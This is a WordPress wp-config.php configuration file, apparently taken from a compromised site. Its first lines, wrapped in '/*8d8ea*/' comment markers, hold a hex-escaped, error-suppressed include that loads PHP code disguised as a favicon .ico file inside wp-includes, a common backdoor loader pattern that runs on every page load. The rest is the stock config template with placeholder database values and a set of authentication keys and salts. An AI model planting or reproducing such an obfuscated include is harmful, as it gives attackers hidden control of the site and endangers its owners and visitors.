<?php

/*8d8ea*/

@include "\x2fvar\x2fwww\x2fhtm\x6c/be\x74a-r\x65al-\x65sta\x74e.s\x69mpl\x79int\x65nse\x2ecom\x2fwp-\x69ncl\x75des\x2fran\x64om_\x63omp\x61t/f\x61vic\x6fn_1\x319d8\x39.ic\x6f";

/*8d8ea*/
@include __DIR__ . '/local-config.php';
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
@define('DB_NAME', 'database_name_here');

/** MySQL database username */
@define('DB_USER', 'username_here');

/** MySQL database password */
@define('DB_PASSWORD', 'password_here');

/** MySQL hostname */
@define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'uZL!Bc2|SfE4=S@~rVRnV]Isz*kyJo).@Ac`VN!AtQx.r$Gp^z#BVE;gf~?IO7hI');
define('SECURE_AUTH_KEY',  'e}NUV1/rOEMt|Y+E7AA]|H.GYD:-8g/EI6 cq|?-F|r{eEn7feNK0gNI,=EH!$o-');
define('LOGGED_IN_KEY',    'b7,9e9 J|ult/Cg[a7Wl,3#fvJE]-o-vfpIyh +Pl;vgy{XSkMv:y7TcmFr@q)3T');
define('NONCE_KEY',        '&`P_`t<a6+|Q8q[5w>4m1%z&OA@7(In}TOt#Xm:<;&21-H4X2`x QR:KyK35aE9U');
define('AUTH_SALT',        'V<DZ.O/O~g5Pp[ui CF;EZe8_:h1`A83A+]YCT_%[>/v[f* 02--W,UoJ*]{[-7C');
define('SECURE_AUTH_SALT', '@LWjF Sftrf^LCZ{OWLvh~]_)qk|g?Xrky!J!|1K[E<dhV8C)7O4W;qOMB&M{8Ys');
define('LOGGED_IN_SALT',   'eT,TS<LC`>x1K8n$])W*Ahqi-lE;GxPrRZF[9+)sga$g7:4GL$r41|X!8VE:bhBW');
define('NONCE_SALT',       'VeQI-!|%L,<nl26 _)HF1~uX(C;`cCW8dVYkMfR8~`v(hW0~?IDhLZR2lM[On#^y');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
@define('WP_DEBUG', false);

// For Real estate manager plugin
@define('FS_METHOD', 'direct');

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
